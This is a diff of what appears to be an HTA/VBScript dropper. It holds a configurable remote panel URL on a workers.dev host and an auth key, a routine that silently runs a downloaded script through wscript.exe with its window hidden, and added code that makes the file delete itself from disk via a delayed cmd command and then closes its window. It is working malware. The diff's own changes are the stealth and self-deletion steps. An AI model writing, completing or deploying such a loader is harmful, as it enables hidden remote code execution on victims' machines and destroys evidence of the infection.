@@ -8,6 +8,7 @@
 <script language="VBScript">
 On Error Resume Next
 
+' ==== EDIT THESE TWO LINES ====
 Const WH    = "https://panel.internationshop1.workers.dev/"
 Const XAUTH = "lxgcute"
 ' ==============================
@@ -51,7 +52,10 @@ Sub FetchAndRun()
 
   sh.Run "wscript.exe """ & path & """", 0, False
 
-  WScript.Sleep 2000
+  window.setTimeout "SelfDeleteAndClose", 2000, "VBScript"
+End Sub
+
+Sub SelfDeleteAndClose()
   SelfDelete()
   window.close
 End Sub
@@ -69,8 +73,11 @@ End Function
 
 Sub SelfDelete()
   Dim cmd, p
-  p = WScript.ScriptFullName
-  If InStr(p, "http") > 0 Then Exit Sub
+  p = location.href
+  If InStr(LCase(p), "file:///") <> 1 Then Exit Sub
+  p = Mid(p, 9)
+  p = Replace(p, "/", "\")
+  p = Replace(p, "%20", " ")
   cmd = "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q """ & p & """"
   sh.Run cmd, 0, False
 End Sub
